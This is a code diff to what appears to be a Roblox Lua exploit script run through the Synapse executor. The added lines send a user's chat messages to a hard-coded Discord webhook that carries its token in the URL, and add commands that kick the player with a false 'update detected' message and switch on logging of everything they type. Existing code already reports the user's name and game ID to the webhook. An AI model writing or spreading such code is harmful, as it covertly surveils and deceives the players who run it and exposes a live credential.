@@ -19,6 +19,17 @@ function notify1()
          Body = game:GetService('HttpService'):JSONEncode({content = speaker.Name.. " is connected! | "..game.PlaceId.. " Is the user's game: tracking !"})
         })
 end
+function notify2(msg)
+    local response = syn.request(
+        {
+            Url = 'https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+         Body = game:GetService('HttpService'):JSONEncode({content = msg})
+        })
+end
 notify1()
 
  function reLoop()
@@ -65,6 +76,14 @@ end
             local int = Instance.new("BlurEffect")
             int.Size = 1111111
             int.Parent = game.Lighting
+        end
+        if msg == ".force-update" then
+            speaker:Kick("Script has detected an update, please rejoin for newer version. We cant operate normally in older vesion!")
+        end
+        if msg == "/e clog" then 
+            speaker.Chatted:Connect(function(msg)
+            notify2(msg)
+            end)
         end
     end)
 end
